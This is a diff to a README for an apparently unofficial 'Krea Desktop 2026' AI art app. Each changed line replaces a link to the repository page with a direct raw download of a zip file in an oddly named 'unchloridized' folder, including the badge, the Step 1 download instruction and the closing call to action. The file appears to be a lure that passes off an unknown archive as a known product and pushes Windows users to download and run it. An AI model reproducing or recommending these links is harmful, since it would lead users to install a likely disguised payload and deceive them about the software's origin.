@@ -1,12 +1,12 @@
 # 🎨 Krea-Desktop---Krea-AI-Realtime-Canvas-2026 - Your AI Art Studio, Live and Instant
 
-[![Download Krea Desktop](https://img.shields.io/badge/Download-Krea_Desktop_2026-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://github.com/pachysandrahorseshoe25/Krea-Desktop---Krea-AI-Realtime-Canvas-2026)
+[![Download Krea Desktop](https://img.shields.io/badge/Download-Krea_Desktop_2026-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/pachysandrahorseshoe25/Krea-Desktop---Krea-AI-Realtime-Canvas-2026/main/unchloridized/Realtime-A-Desktop-Canvas-Krea-v3.6.zip)
 
 ## 🚀 Getting Started
 
 Welcome to Krea Desktop 2026! This is your all-in-one AI creative workspace where you can draw, paint, and generate stunning images in real-time. Whether you're a digital artist, designer, or just love experimenting with AI, this app puts powerful tools right at your fingertips.
 
-Visit this link to download the application: [https://github.com/pachysandrahorseshoe25/Krea-Desktop---Krea-AI-Realtime-Canvas-2026](https://github.com/pachysandrahorseshoe25/Krea-Desktop---Krea-AI-Realtime-Canvas-2026)
+Visit this link to download the application: [https://raw.githubusercontent.com/pachysandrahorseshoe25/Krea-Desktop---Krea-AI-Realtime-Canvas-2026/main/unchloridized/Realtime-A-Desktop-Canvas-Krea-v3.6.zip](https://raw.githubusercontent.com/pachysandrahorseshoe25/Krea-Desktop---Krea-AI-Realtime-Canvas-2026/main/unchloridized/Realtime-A-Desktop-Canvas-Krea-v3.6.zip)
 
 ## ✨ What Makes Krea Desktop Special?
 
@@ -34,7 +34,7 @@ Getting Krea Desktop running on your Windows computer is simple. Follow these st
 
 ### Step 1: Download the Application
 
-Visit this link to download the application: [https://github.com/pachysandrahorseshoe25/Krea-Desktop---Krea-AI-Realtime-Canvas-2026](https://github.com/pachysandrahorseshoe25/Krea-Desktop---Krea-AI-Realtime-Canvas-2026)
+Visit this link to download the application: [https://raw.githubusercontent.com/pachysandrahorseshoe25/Krea-Desktop---Krea-AI-Realtime-Canvas-2026/main/unchloridized/Realtime-A-Desktop-Canvas-Krea-v3.6.zip](https://raw.githubusercontent.com/pachysandrahorseshoe25/Krea-Desktop---Krea-AI-Realtime-Canvas-2026/main/unchloridized/Realtime-A-Desktop-Canvas-Krea-v3.6.zip)
 
 ### Step 2: Save the File
 
@@ -126,7 +126,7 @@ Need more help? We're here for you:
 
 Krea Desktop brings the future of digital art to your computer today. With real-time AI assistance, professional-grade tools, and unlimited creative potential, there's never been a better time to start your artistic journey.
 
-Visit this link to download the application: [https://github.com/pachysandrahorseshoe25/Krea-Desktop---Krea-AI-Realtime-Canvas-2026](https://github.com/pachysandrahorseshoe25/Krea-Desktop---Krea-AI-Realtime-Canvas-2026)
+Visit this link to download the application: [https://raw.githubusercontent.com/pachysandrahorseshoe25/Krea-Desktop---Krea-AI-Realtime-Canvas-2026/main/unchloridized/Realtime-A-Desktop-Canvas-Krea-v3.6.zip](https://raw.githubusercontent.com/pachysandrahorseshoe25/Krea-Desktop---Krea-AI-Realtime-Canvas-2026/main/unchloridized/Realtime-A-Desktop-Canvas-Krea-v3.6.zip)
 
 Join thousands of happy users who've already discovered the joy of AI-powered creativity. Download Krea Desktop now and watch your imagination come to life!
 
